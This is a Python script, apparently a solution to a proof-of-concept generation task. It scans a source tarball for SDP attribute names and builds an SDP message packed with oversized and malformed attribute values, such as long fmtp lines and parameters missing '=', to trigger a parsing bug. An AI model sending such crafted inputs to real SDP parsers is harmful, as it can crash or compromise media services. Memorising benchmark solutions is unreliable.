import tarfile
import re
from typing import List


class Solution:
    def solve(self, src_path: str) -> bytes:
        manual_attrs: List[str] = [
            "rtpmap",
            "fmtp",
            "ptime",
            "maxptime",
            "rtcp",
            "sendrecv",
            "sendonly",
            "recvonly",
            "inactive",
            "setup",
            "mid",
            "extmap",
            "candidate",
            "ice-ufrag",
            "ice-pwd",
            "fingerprint",
            "ssrc",
            "ssrc-group",
            "msid-semantic",
            "msid",
            "group",
            "rtcp-fb",
            "rtcp-mux",
            "rtcp-rsize",
            "sctpmap",
            "ts-refclk",
            "keywds",
            "tool",
            "charset",
            "control",
            "framerate",
            "cliprect",
            "range",
            "ice-options",
            "rtcp-xr",
            "label",
            "simulcast",
            "rid",
            "imageattr",
            "rtcp-fb-trr-int",
            "maxprate",
            "orient",
        ]

        attrs = list(dict.fromkeys(manual_attrs))  # preserve order, unique

        # Try to discover additional attribute names from the source tarball
        try:
            dynamic_attrs = set()
            with tarfile.open(src_path, "r:*") as tar:
                for member in tar.getmembers():
                    if not member.isfile():
                        continue
                    name_lower = member.name.lower()
                    if "sdp" not in name_lower:
                        continue
                    if not name_lower.endswith(
                        (".c", ".h", ".cc", ".cpp", ".cxx", ".hh", ".hpp")
                    ):
                        continue
                    f = tar.extractfile(member)
                    if f is None:
                        continue
                    try:
                        data = f.read()
                    except Exception:
                        continue
                    try:
                        text = data.decode("utf-8", "ignore")
                    except Exception:
                        continue

                    # Extract C string literals that look like attribute names
                    for m in re.finditer(r'"([^"\n]{1,40})"', text):
                        s = m.group(1)
                        if not (1 <= len(s) <= 20):
                            continue
                        if not re.fullmatch(r"[A-Za-z0-9_\-\.]+", s):
                            continue
                        if s.isdigit():
                            continue
                        if s in ("%s", "%d", "%u", "%p"):
                            continue
                        dynamic_attrs.add(s)
                        if len(dynamic_attrs) >= 64:
                            break
                    if len(dynamic_attrs) >= 64:
                        break

            # Append discovered attrs, preserving existing manual ones
            for s in dynamic_attrs:
                if s not in attrs:
                    attrs.append(s)
        except Exception:
            # If anything goes wrong reading/parsing the tarball, just use manual attrs
            pass

        # Limit number of attributes to keep PoC size reasonable
        max_attrs = 64
        if len(attrs) > max_attrs:
            attrs = attrs[:max_attrs]

        lines: List[str] = []

        # Basic SDP skeleton
        lines.append("v=0")
        lines.append("o=- 0 0 IN IP4 127.0.0.1")
        lines.append("s=-")
        lines.append("c=IN IP4 127.0.0.1")
        lines.append("t=0 0")
        lines.append("m=audio 9 RTP/AVP 0 8 96 97 98")
        lines.append("m=video 9 RTP/AVP 96 97 98")
        lines.append("a=rtpmap:0 PCMU/8000")
        lines.append("a=rtpmap:8 PCMA/8000")
        lines.append("a=rtpmap:96 H264/90000")
        lines.append("a=sendrecv")

        # Value patterns intended to tickle parameter parsing / end-of-value handling
        value_patterns = [
            "A" * 96,  # long alpha-only, no punctuation
            "1" * 96,  # long digit-only
            "profile-level-id=42801F;packetization-mode=1;level-asymmetry-allowed=1;",
            "param1;param2;param3;param4;",  # missing '='
            "x=y;z;w=1;;",  # malformed mix
            "token1=AAAA;token2=BBBB;token3;",  # trailing token without '='
        ]

        # Generate a variety of attribute lines for each attribute name
        for idx, attr in enumerate(attrs):
            # Simple attribute without value
            lines.append(f"a={attr}")

            # Attribute with its own name as value
            lines.append(f"a={attr}:{attr}")

            # Attribute with multiple candidate problematic value patterns
            for vp in value_patterns:
                lines.append(f"a={attr}:{vp}")

            # For the first few attributes, also generate space-separated variants
            if idx < 10:
                for vp in value_patterns[:3]:  # subset to control size
                    lines.append(f"a={attr} {vp}")

        # Extra-long fmtp lines, as fmtp parsing is often complex
        long_chunk = "CDEFGHIJKLMNOPQRSTUVWXYZ" * 16
        lines.append("a=fmtp:96 " + long_chunk)
        lines.append("a=fmtp:96 param=" + long_chunk + ";;")
        lines.append("a=fmtp:96 param1=1;param2=2;param3=3;param4=4;param5=5;")

        sdp_text = "\r\n".join(lines) + "\r\n"
        return sdp_text.encode("ascii", "replace")